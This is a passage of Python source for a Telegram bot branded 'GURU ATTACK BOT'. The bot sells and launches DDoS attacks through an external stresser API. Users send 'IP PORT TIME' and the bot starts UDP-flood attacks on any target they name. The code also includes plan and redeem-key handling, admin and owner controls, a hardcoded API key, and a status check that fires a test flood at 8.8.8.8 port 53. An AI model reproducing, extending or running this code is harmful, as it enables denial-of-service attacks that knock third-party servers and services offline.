        text += f"\n... and {len(users) - 20} more"
    
    await query.edit_message_text(
        text[:4000],
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text("🔌 Checking API Status...")
    
    try:
        api_url = os.getenv("API_URL", "https://mrstresser.com/api")
        api_key = os.getenv("API_KEY", "1w7msrL79rwnahnvzzRfSA")
        
        if not api_key:
            await query.edit_message_text("❌ API_KEY not configured!")
            return
        
        # Simple test request
        params = {
            "key": api_key,
            "host": "8.8.8.8",
            "port": "53",
            "time": "30",
            "method": "udp-free",  # Changed to udp-free
            "concs": "1"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*"
        }
        
        connector = aiohttp.TCPConnector(limit=10)
        timeout = aiohttp.ClientTimeout(total=35, connect=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers) as session:
            start_time = time.time()
            async with session.get(api_url, params=params) as response:
                elapsed = time.time() - start_time
                
                try:
                    response_text = await response.text(encoding='utf-8', errors='ignore')
                    try:
                        response_data = json.loads(response_text)
                    except:
                        response_data = {"raw": response_text[:100]}
                except:
                    response_text = "Unable to read response"
                    response_data = {}
                
                if response.status == 200:
                    message = f"✅ API Connected - Status: {response.status} (Response: {elapsed:.2f}s)"
                else:
                    message = f"❌ Error (Status: {response.status})"
                
                await query.edit_message_text(
                    f"🔌 *API STATUS*\n\n{message}\n\n📊 Response: {str(response_data)[:200]}\n\n⚡ Concurrent: {DEFAULT_CONCURRENT}\n📡 Default: UDP-FREE",
                    parse_mode='Markdown',
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 REFRESH", callback_data="owner_api_status")],
                        [InlineKeyboardButton("🔙 BACK", callback_data="owner")]
                    ])
                )
    except Exception as e:
        await query.edit_message_text(
            f"❌ API Error: {str(e)}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    user_id = user.id
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    await query.edit_message_text(
        "👋 WELCOME BACK",
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None
    )

async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_attack'):
        await process_attack(update, context)
    elif context.user_data.get('awaiting_promote'):
        await process_promote(update, context)
    elif context.user_data.get('awaiting_ban'):
        await process_ban(update, context)
    elif context.user_data.get('awaiting_unban'):
        await process_unban(update, context)
    elif context.user_data.get('awaiting_broadcast'):
        await process_broadcast(update, context)

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    user_id = update.effective_user.id
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ Bot is paused!")
        context.user_data['awaiting_attack'] = False
        return
    
    can_start, msg = await attack_manager.can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(msg, parse_mode='Markdown')
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        if len(parts) < 3:
            await update.message.reply_text(
                f"❌ Use: `IP PORT TIME`\nExample: `91.108.17.41 32001 60`\n"
                f"Default method: UDP-FLOOD (UDP-FREE)",
                parse_mode='Markdown'
            )
            return
        
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        # Default to UDP-FLOOD if no method selected
        method = context.user_data.get('attack_method', 'UDP-FLOOD')
        
        # Check if concurrent is provided
        concurrent = DEFAULT_CONCURRENT
        if len(parts) > 3 and parts[3].isdigit():
            concurrent = int(parts[3])
            if concurrent < MIN_CONCURRENT or concurrent > MAX_CONCURRENT:
                await update.message.reply_text(f"❌ Concurrent must be between {MIN_CONCURRENT} and {MAX_CONCURRENT}!")
                context.user_data['awaiting_attack'] = False
                return
        
        if duration < MIN_DURATION or duration > MAX_DURATION:
            await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
            context.user_data['awaiting_attack'] = False
            return
        
        attack_id, msg = await attack_manager.start_attack(
            user_id, target, port, duration, method, context, concurrent
        )
        
        if not attack_id:
            await update.message.reply_text(f"❌ {msg}", parse_mode='Markdown')
            context.user_data['awaiting_attack'] = False
            return
        
        await update.message.reply_text(
            f"✅ *ATTACK STARTED!*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: `{duration}s`\n"
            f"📡 Method: `{method}` (UDP-FREE)\n"
            f"🔄 Concurrent: **{concurrent}**\n"
            f"⚡ Status: **RUNNING**\n\n"
            f"⚠️ Only 1 attack at a time!",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

# ===== RUN BOT =====
application = None

def run_bot():
    global application
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app_bot = Application.builder().token(TELEGRAM_TOKEN).build()
    application = app_bot
    
    # COMMANDS
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("attack", attack_command))
    app_bot.add_handler(CommandHandler("stop", stop_command))
    app_bot.add_handler(CommandHandler("setconcurrent", set_concurrent_command))
    app_bot.add_handler(CommandHandler("testapi", testapi_command))
    app_bot.add_handler(CommandHandler("testconcs", test_concurrents_command))
    app_bot.add_handler(CommandHandler("status", status_command))
    app_bot.add_handler(CommandHandler("redeem", redeem_command))
    app_bot.add_handler(CommandHandler("cancel", cancel))
    
    # CALLBACK QUERY HANDLERS
    app_bot.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app_bot.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    app_bot.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
    app_bot.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    app_bot.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app_bot.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
    app_bot.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
    app_bot.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
    app_bot.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
    app_bot.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
    app_bot.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
    app_bot.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
    app_bot.add_handler(CallbackQueryHandler(owner_concurrent_callback, pattern="^owner_concurrent$"))
    app_bot.add_handler(CallbackQueryHandler(owner_pause_callback, pattern="^owner_pause$"))
    app_bot.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
    app_bot.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
    app_bot.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
    app_bot.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
    app_bot.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
    app_bot.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
    app_bot.add_handler(CallbackQueryHandler(owner_api_status, pattern="^owner_api_status$"))
    app_bot.add_handler(CallbackQueryHandler(owner_stop_callback, pattern="^owner_stop$"))
    app_bot.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
    
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
    
    loop.run_until_complete(app_bot.initialize())
    loop.run_until_complete(app_bot.start())
    loop.run_until_complete(app_bot.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ GURU Bot started!")
    loop.run_forever()

# ===== MAIN =====
if __name__ == "__main__":
    print("=" * 60)
    print("🔥 GURU ATTACK BOT - UDP-FREE DEFAULT 🔥")
    print(f"⚡ DEFAULT CONCURRENT: {DEFAULT_CONCURRENT}")
    print(f"📊 CONCURRENT RANGE: {MIN_CONCURRENT}-{MAX_CONCURRENT}")
    print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
    print(f"📡 Default Method: UDP-FLOOD (UDP-FREE)")
    print(f"📡 Methods: {len(ATTACK_METHODS)} methods")
    print("=" * 60)
    print("💡 Commands:")
    print("  /attack IP PORT TIME [METHOD] [CONCURRENT] - Start attack (default: UDP-FLOOD)")
    print("  /setconcurrent NUMBER - Change concurrent value (default: 1)")
    print("  /testapi HOST PORT TIME [CONCURRENT] [METHOD] - Test API")
    print("  /testconcs HOST PORT TIME [METHOD] - Test all concurrent values")
    print("  /status - Show bot status")
    print("  /stop - Stop running attack")
    print("=" * 60)
    
    try:
        import hypercorn
        from hypercorn.config import Config
        from hypercorn.asyncio import serve
        
        # Start bot in background
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        
        logger.info("✅ Bot thread started")
        
        # Run Quart with hypercorn
        config = Config()
        config.bind = [f"0.0.0.0:{PORT}"]
        config.worker_class = "asyncio"
        
        asyncio.run(serve(app, config))
    except ImportError:
        # Fallback if hypercorn not installed
        logger.warning("⚠️ hypercorn not installed, running bot only")
        run_bot()